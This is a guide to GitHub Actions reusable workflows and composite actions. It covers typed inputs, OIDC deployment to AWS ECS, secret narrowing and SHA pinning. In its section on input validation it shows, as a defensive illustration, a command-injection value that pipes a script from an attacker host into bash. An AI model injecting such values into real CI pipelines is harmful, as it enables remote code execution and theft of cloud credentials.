# Reusable Workflows and Actions

> **Who this is for**: Platform and service teams standardizing CI/CD across repositories.

## The short version

Copy-pasting a deployment job into every service repository means a fix has to land in tens of places to take effect everywhere, and usually doesn't. A **reusable workflow** is a job definition that lives once, in a central repository, and every caller invokes it by reference — so the runner, permissions, and steps only have to be correct in one place. The caller supplies typed inputs; the callee supplies the job graph.

**What you need (4 things):**

1. A reusable workflow reference pinned to a tag or SHA (`uses: owner/repo/.github/workflows/name.yml@ref`).
2. The `permissions` your caller job grants — the callee can never exceed this ceiling.
3. The typed `with:` inputs the callee's `workflow_call.inputs` contract declares.
4. Any `secrets:` the callee explicitly requires (never `secrets: inherit`).

**The code:**

```yaml
# acme/platform-workflows/.github/workflows/greet.yml (callee, central repo)
on:
  workflow_call:
    inputs:
      service: { required: true, type: string }
permissions:
  contents: read
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ inputs.service }}"

# caller job, in the service repository
jobs:
  deploy-production:
    permissions: { contents: read }
    uses: acme/platform-workflows/.github/workflows/greet.yml@0123456789abcdef0123456789abcdef01234567
    with: { service: orders }
# job log → Deploying orders
```

**Success signal:** the caller's job log prints `Deploying orders`. **Failure tell:** a typo'd `uses:` ref fails immediately with "workflow was not found" — the callee's steps never appear in the log at all.

**Not handled yet:** [the full ECS deployment contract with OIDC credentials and a convergence check](#2-a-reusable-workflow-is-a-typed-deployment-contract-between-repositories), [validating and bounding caller inputs](#4-inputs-are-a-versioned-api-not-a-remote-shell), [narrowing secrets across call layers](#5-each-call-layer-can-only-narrow-the-secrets-it-received).

---

Optional background: read [Build, Publish, and Promote](03_build_publish_and_promote.md) first if you haven't — it isn't required for the baseline above.

---

## 1. Match the Reuse Mechanism to What Crosses the Boundary

| Mechanism | Reuses | Best for |
|-----------|--------|----------|
| Reusable workflow | Jobs, runners, permissions, environments, and steps | Organization CI and deployment contracts |
| Composite action | A sequence of steps inside one caller job | Setup, validation, or a focused command wrapper |
| Workflow template | Starter YAML copied into a repository | Discoverability and initial onboarding |
| YAML anchor | Repeated YAML within one workflow file | Small local fragments |
| Versioned CLI/script | Logic callable locally and from any CI engine | Complex, testable, portable implementation |

```text
organization contract     → reusable workflow
repeatable step sequence  → composite action
complex domain behavior   → tested CLI
starter configuration     → workflow template
```

> **Core:** the mechanism follows what has to be shared, not preference. Share a runner, a permission set, or an environment binding → reusable workflow. Share only a step sequence inside one job → composite action. Share logic complex enough to need its own tests, and runnable outside CI too → a versioned CLI.

Avoid turning the reusable workflow into a hidden application. It should coordinate explicit tools and expose a small, typed contract.

---

## 2. A Reusable Workflow Is a Typed Deployment Contract Between Repositories

Three external controls must already exist, and caller YAML cannot prove them:

| Boundary | Administrative owner and source of truth | Positive proof | Failure tell |
|---|---|---|---|
| Central workflow access | `platform-workflows` repository admin; Actions access settings/API | `orders` can resolve the pinned workflow | `workflow was not found` from a repository outside the allowlist |
| Caller environment | `orders` environment admin; environment settings/API | protected `main` waits for required reviewers, then receives variables | an unprotected ref is refused before credentials are exposed |
| AWS federation | cloud security owner; live IAM trust policy | approved workflow/ref assumes the role | changed repository, ref, workflow, or environment receives `AccessDenied` |

This trust-policy condition excerpt binds the OpenID Connect token's `aud` (intended recipient) and `sub` (workload identity string); the full policy belongs in [Permissions, Secrets, and OIDC](../03_security_and_supply_chain/01_permissions_secrets_and_oidc.md):

```json
{"aud":"sts.amazonaws.com","sub":"repo:acme/orders:environment:production"}
```

The example below deploys to Amazon **ECS** (Elastic Container Service), AWS's managed service for running containerized tasks and services — it's the deployment target the reusable workflow updates. The caller authenticates with **OIDC** (OpenID Connect), a workload-identity protocol that lets the Actions runner exchange a short-lived signed token for temporary AWS credentials instead of a stored long-lived key — it's the credential exchange the first step performs. That exchange assumes an IAM role identified by its **ARN** (Amazon Resource Name), the globally unique string AWS uses to name a resource, such as `arn:aws:iam::123456789012:role/orders-production-deploy` — it's the role identifier the caller passes in as an input.

Central repository:

```yaml
# acme/platform-workflows/.github/workflows/deploy-ecs.yml
name: Deploy ECS task definition

on:
  workflow_call:
    inputs:
      environment:
        description: GitHub environment in the caller repository
        required: true
        type: string
      aws_region:
        required: true
        type: string
      aws_role_arn:
        required: true
        type: string
      cluster:
        required: true
        type: string
      service:
        required: true
        type: string
      task_definition_arn:
        description: Immutable ECS task-definition revision prepared by the build
        required: true
        type: string

permissions:
  contents: read
  id-token: write

jobs:
  deploy:
    name: Deploy ${{ inputs.service }} to ${{ inputs.environment }}
    runs-on: ubuntu-latest
    timeout-minutes: 30
    environment: ${{ inputs.environment }}
    concurrency:
      group: ecs-${{ inputs.environment }}-${{ inputs.cluster }}-${{ inputs.service }}
      cancel-in-progress: false

    steps:
      - name: Resolve a reviewed target mapping
        id: target
        env:
          REQUESTED_ENVIRONMENT: ${{ inputs.environment }}
          TASK_DEFINITION_ARN: ${{ inputs.task_definition_arn }}
        run: |
          set -euo pipefail
          [[ "$TASK_DEFINITION_ARN" =~ ^arn:aws:ecs:[a-z0-9-]+:[0-9]{12}:task-definition/orders:[0-9]+$ ]]
          case "$REQUESTED_ENVIRONMENT" in
            staging)
              echo "region=eu-west-1" >> "$GITHUB_OUTPUT"
              echo "role=arn:aws:iam::123456789012:role/orders-staging-deploy" >> "$GITHUB_OUTPUT"
              echo "cluster=staging" >> "$GITHUB_OUTPUT"
              echo "service=orders" >> "$GITHUB_OUTPUT" ;;
            production)
              echo "region=eu-west-1" >> "$GITHUB_OUTPUT"
              echo "role=arn:aws:iam::123456789012:role/orders-production-deploy" >> "$GITHUB_OUTPUT"
              echo "cluster=production" >> "$GITHUB_OUTPUT"
              echo "service=orders" >> "$GITHUB_OUTPUT" ;;
            *) echo "unsupported environment" >&2; exit 2 ;;
          esac

      - name: Assume the environment deployment role
        uses: aws-actions/configure-aws-credentials@61815dcd50bd041e203e49132bacad1fd04d2708 # v5.1.1
        with:
          role-to-assume: ${{ steps.target.outputs.role }}
          aws-region: ${{ steps.target.outputs.region }}

      - name: Update the service
        env:
          ECS_CLUSTER: ${{ steps.target.outputs.cluster }}
          ECS_SERVICE: ${{ steps.target.outputs.service }}
          TASK_DEFINITION_ARN: ${{ inputs.task_definition_arn }}
        run: |
          set -euo pipefail
          aws ecs update-service \
            --cluster "$ECS_CLUSTER" \
            --service "$ECS_SERVICE" \
            --task-definition "$TASK_DEFINITION_ARN" \
            --output json > deployment.json

      - name: Wait for platform convergence
        env:
          ECS_CLUSTER: ${{ steps.target.outputs.cluster }}
          ECS_SERVICE: ${{ steps.target.outputs.service }}
        run: |
          set -euo pipefail
          aws ecs wait services-stable \
            --cluster "$ECS_CLUSTER" \
            --services "$ECS_SERVICE"
```

The service repository calls it as a job:

```yaml
jobs:
  deploy-production:
    permissions:
      contents: read
      id-token: write
    uses: acme/platform-workflows/.github/workflows/deploy-ecs.yml@0123456789abcdef0123456789abcdef01234567
    with:
      environment: production
      aws_region: eu-west-1
      aws_role_arn: arn:aws:iam::123456789012:role/orders-production-deploy
      cluster: production
      service: orders
      task_definition_arn: ${{ needs.prepare-release.outputs.task_definition_arn }}
```

The example SHA is illustrative. Replace it with the full verified commit for the approved release of the central workflow.

**Success signal:** the called `deploy` job goes green only after its last step, `aws ecs wait services-stable`, exits `0` — the CLI polls the service until its `deployments` list collapses to one entry whose `rolloutState` reads `COMPLETED`. **Failure tell:** if replacement tasks keep failing, `services-stable` instead times out (around 10 minutes) and exits non-zero, which fails the step and the job. Inspect `aws ecs describe-services --cluster "$ECS_CLUSTER" --services "$ECS_SERVICE"`: a stuck rollout shows `rolloutState: IN_PROGRESS` alongside an `events` list recording repeated task stops; `aws ecs describe-tasks` on those stopped task ARNs shows the `stoppedReason` — typically a failed health check or a non-zero container exit code.

---

## 3. A Called Workflow Runs Inside the Caller's Run, Not a Separate One

A called workflow is incorporated into the caller's run:

```text
service repository workflow run
    ├── local build job
    └── called deployment workflow
         ├── jobs appear in the same run
         ├── permissions cannot exceed the caller's ceiling
         └── actions/checkout checks out the caller repository
```

This is different from dispatching a separate workflow run in the central repository.

Important rules:

- a reusable workflow is called at `jobs.<job_id>.uses`, not from a step;
- cross-repository references accept a branch, tag, or SHA; a commit SHA is safest;
- the called workflow must be accessible to the caller;
- nested-workflow permissions can only stay the same or decrease;
- secrets reach only the directly called workflow unless passed again;
- environment secrets are not passed through `workflow_call`; a job-level environment resolves its own environment secrets;
- GitHub Enterprise Cloud currently supports a caller plus up to nine nested reusable workflows, and cycles are forbidden.

> **Edge case:** most organizations never approach the nine-level nesting limit — one or two levels covers nearly every real call graph. Treat a call chain that keeps growing toward the limit as a design smell, not a target to fill.

Even though ten levels are supported, shallow call graphs are easier to review and debug.

---

## 4. Inputs Are a Versioned API, Not a Remote Shell

Good inputs express intent and immutable identity:

```yaml
inputs:
  environment: production
  image_digest: sha256:4ae0...9c1d
  service: orders
  migration_version: "2026_07_29_01"
```

Poor inputs expose internal commands:

```yaml
inputs:
  pre_deploy_shell: "..."
  arbitrary_aws_args: "..."
  extra_permissions: "write-all"
```

Suppose the reusable workflow above accepted `pre_deploy_shell` and ran it directly:

```yaml
- run: ${{ inputs.pre_deploy_shell }}
```

A pull request from any caller repository can set that input to `"; curl https://attacker.example/x.sh | bash #"`. GitHub expands the expression into the step's generated shell script before executing it, so the resulting command is the caller's intended text followed by the attacker's shell metacharacters — the shell has no way to tell them apart and runs both. This step executes after `configure-aws-credentials`, so the injected command runs with the same temporary AWS credentials the deployment steps use: it can read the task definition, change the service, or exfiltrate the short-lived token before it expires. That is the reusable workflow's own deployment authority, gained through nothing more than a string input.

The fix is not a stricter pattern on the input; it is removing the caller's ability to choose a command at all. A declared, enumerated **mode** (`deploy`, `deploy-and-migrate`, ...) keeps the actual shell logic inside the reviewed reusable-workflow code, where changing what commands run requires a pull request against the central repository — not an arbitrary caller input.

Validate bounded values:

```yaml
- name: Validate contract
  env:
    TARGET: ${{ inputs.environment }}
    DIGEST: ${{ inputs.image_digest }}
  run: |
    set -euo pipefail
    case "$TARGET" in
      staging|production) ;;
      *) printf 'Unsupported environment: %s\n' "$TARGET" >&2; exit 2 ;;
    esac
    [[ "$DIGEST" =~ ^sha256:[0-9a-f]{64}$ ]]
```

> **Production:** ship this validation step before the workflow reaches a real environment. A typed `string` input still lets a caller pass an unsupported environment name or a malformed digest straight through to the AWS calls — the type system checks shape, not the bounded set of values you actually support.

Do not accept arbitrary shell fragments. If extensibility is needed, expose a declared mode or put service-specific behavior before or after the reusable workflow in separate jobs.

---

## 5. Each Call Layer Can Only Narrow the Secrets It Received

Prefer named secrets over `secrets: inherit`:

```yaml
jobs:
  call-release:
    uses: acme/platform-workflows/.github/workflows/release.yml@0123456789abcdef0123456789abcdef01234567
    secrets:
      signing_key: ${{ secrets.RELEASE_SIGNING_KEY }}
```

Better still, replace static cloud credentials with OIDC and keep non-sensitive identifiers such as role ARNs in `vars` or typed inputs.

If workflow A calls B and B calls C, C receives only the secrets B explicitly passes. This property is useful: each layer can reduce authority.

---

## 6. Reusable Workflows and Composite Actions Own Different Layers of Reuse

Use a reusable workflow when runner and permission policy matter:

```text
reusable workflow
├── chooses an approved runner group
├── requests a narrow token
├── references a protected environment
└── invokes a versioned deployment action
```

Use a composite action for a step-level algorithm:

```yaml
# action.yml
name: Validate release manifest
description: Verify schema, digest, and repository identity

inputs:
  manifest:
    description: Path to the release manifest
    required: true

runs:
  using: composite
  steps:
    - shell: bash
      env:
        MANIFEST: ${{ inputs.manifest }}
      run: "${{ github.action_path }}/validate.sh \"$MANIFEST\""
```

Composite actions cannot define jobs or choose runners. They also should not accept raw secrets unless the caller passes a secret through a declared input.

> **Key insight**: runner selection and permission policy belong in a reusable workflow, a step-level algorithm belongs in a composite action, and any behavior complex or portable enough to need its own tests belongs in a versioned CLI. Putting logic in the wrong layer is how teams end up with reusable workflows nobody can review and composite actions that quietly reimplement CI orchestration.

---

## 7. Pin to a SHA and Roll Out Central Changes Through Reviewed PRs

A practical lifecycle:

```text
feature branch
    ↓
contract tests in fixture repositories
    ↓
immutable release commit
    ↓
canary callers pin new SHA
    ↓
automated PRs update other callers
    ↓
old release deprecation window
```

A compatible contract change adds an optional `wait_timeout_seconds` input with default `600`. Contract tests run both an old caller that omits it and a new caller that sets `900`; only after both pass does the team publish an immutable release SHA. Canary callers update first, automated PRs move the rest, and the old form remains supported through an announced deprecation window. Removing or making the input mandatory is reserved for a separately reviewed breaking release, never slipped into the existing release line.

Options:

| Reference | Benefit | Cost |
|-----------|---------|------|
| Full commit SHA | Immutable and reviewable | Update automation is required |
| Protected release tag | Human-friendly | A tag can move unless governance prevents it |
| Branch | Immediate central rollout | A central change can break every caller simultaneously |

Use Dependabot or another updater to open reviewed SHA-update pull requests. Include the human-readable release version in a comment.

---

## 8. You Can't Change a Central Workflow Safely Without Knowing Who Calls It

Track:

- caller repository and workflow;
- central workflow SHA;
- result and duration;
- input schema version;
- deprecated input usage;
- deployment target and artifact digest.

GitHub Enterprise Cloud records `prepared_workflow_job` audit data with caller refs and SHAs. Combine this with repository search or dependency graph data to find consumers before a breaking change.

---

## 9. Most Reusable-Workflow Breakage Traces to Checkout, Pinning, or Scope

**The central workflow checks out the wrong repository**

`actions/checkout` inside the reusable workflow checks out the caller's repository. Package central scripts as a referenced action/CLI or check out the central repository explicitly into a separate path.

**A branch reference silently changes behavior**

Pin the workflow to a full SHA and update through PRs.

**The abstraction is too generic**

Dozens of boolean switches create an untestable workflow language. Split contracts by delivery platform or service type.

**Every secret is inherited**

The reusable layer receives authority unrelated to its job. Pass named secrets or use workload identity.

---

## 10. References

- [Reuse workflows](https://docs.github.com/en/enterprise-cloud@latest/actions/how-tos/reuse-automations/reuse-workflows)
- [Reusing workflow configurations](https://docs.github.com/en/enterprise-cloud@latest/actions/concepts/workflows-and-actions/reusing-workflow-configurations)
- [Sharing actions and workflows from a private repository](https://docs.github.com/en/actions/how-tos/reuse-automations/share-across-private-repositories)
- [Using OIDC with reusable workflows](https://docs.github.com/en/actions/how-tos/secure-your-work/security-harden-deployments/oidc-with-reusable-workflows)

---

**Next**: [Cross-Repository Workflow Orchestration](05_cross_repository_orchestration.md)
